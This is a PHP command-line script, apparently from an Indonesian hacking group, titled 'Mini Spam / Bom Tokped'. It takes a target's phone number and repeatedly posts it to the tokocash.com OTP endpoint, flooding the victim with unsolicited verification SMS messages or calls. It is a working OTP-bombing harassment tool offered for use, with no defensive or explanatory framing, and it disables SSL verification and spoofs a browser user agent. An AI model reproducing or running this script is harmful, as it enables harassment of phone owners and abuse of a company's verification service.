<?php
// Berlaku 3 Jam Setelah 3 Jam Bisa Digunakan Kembali :V 
// Gausah Recode 
/*
==========================
IndoSec FrameWork 
@2018
=========================
*/
$init = new Bom();
$ban = "
======================================
 __  __ _       _  _____                       
|  \/  (_)     (_)/ ____|                      
| \  / |_ _ __  _| (___  _ __   __ _ _ __ ___  
| |\/| | | '_ \| |\___ \| '_ \ / _` | '_ ` _ \ 
| |  | | | | | | |____) | |_) | (_| | | | | | |
|_|  |_|_|_| |_|_|_____/| .__/ \__,_|_| |_| |_|
                        | |                    
                        |_|                    
      =>Mini Spam<=          
     => Bom Tokped <= 
     Author : 4ri Farh4n 
     Team : IndoSec Coder Team 
Github : https://github.com/arifarhan16\n
======================================\n";
sleep(3);
echo $ban;
sleep(2);
//Exec Nomor
echo ">>>Nomor Target\n";
sleep(1);
echo "(Ex. 08xxxxxxxxxx) : ";$init->no= trim(fgets(STDIN));
//Exec Bom TIPE
sleep(2);
echo ">>> Tipe Bom\n";
sleep(1);
echo "--1 atau --2 : "; $init->type= trim(fgets(STDIN));
if ($init->type == "--1") {
	for ($i=0; $i < 2; $i++) { 
	    $init->Verif($init->no,$init->type);
	}
}elseif ($init->type == "--2") {
	 $init->Verif($init->no,$init->type);
}
error_reporting(0);
Class Bom {
	public $no;
    public $type;
	public function sendC($url, $page, $params) {
        $ch = curl_init(); 
        curl_setopt ($ch, CURLOPT_URL, $url.$page); 
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
        if(!empty($params)) {
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt ($ch, CURLOPT_POST, 1); 
        }
        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
        $headers  = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
        $headers[] = 'X-Requested-With: XMLHttpRequest';
        curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
        //curl_setopt ($ch, CURLOPT_HEADER, 1);
        $result = curl_exec ($ch);
        curl_close($ch);
        return $result;
    }
    private function getStr($start, $end, $string) {
        if (!empty($string)) {
        $setring = explode($start,$string);
        $setring = explode($end,$setring[1]);
        return $setring[0];
        }
    }
    public function Verif()
    {
        $url = "https://www.tokocash.com/oauth/otp";
        $no = $this->no;
        $type = $this->type;
        if ($type == "--1") {
            $data = "msisdn={$no}&accept=message";
        }elseif ($type == "--2") {
            $data = "msisdn={$no}&accept=call";
        }
        $send = $this->sendC($url, null, $data);
        // echo $send;
        if (preg_match('/otp_attempt_left/', $send)) {
                echo('Berhasil Nih Cuk!');
            } else {
                echo(' Gagaalll :( Asuuu :V');
            }
    }
    
}
?>
